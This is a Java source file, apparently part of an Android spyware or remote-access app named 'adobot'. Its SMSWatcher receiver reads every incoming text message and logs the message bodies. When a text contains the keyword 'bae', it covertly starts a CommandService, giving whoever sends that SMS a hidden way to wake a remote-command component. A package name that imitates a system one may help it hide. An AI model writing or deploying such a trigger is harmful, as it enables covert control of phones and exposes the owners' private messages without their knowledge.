package com.android.adobot;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;

import com.android.adobot.job.CheckJob;

public class SMSWatcher extends BroadcastReceiver {

    private Context context;

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;
        System.out.print("Network Watcher running.............");

        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
					String messageBody = smsMessage.getMessageBody();
                    Log.e("Nocturne", "Message: " + messageBody);
					if(messageBody.contains("bae")){
                        Log.e("Nocturne", "Appel forcé de l'api");
                        startClient();
                    }
				}
            }
        }
    }

    void startClient() {
        Intent i = new Intent(context, CommandService.class);
        context.startService(i);
    }
}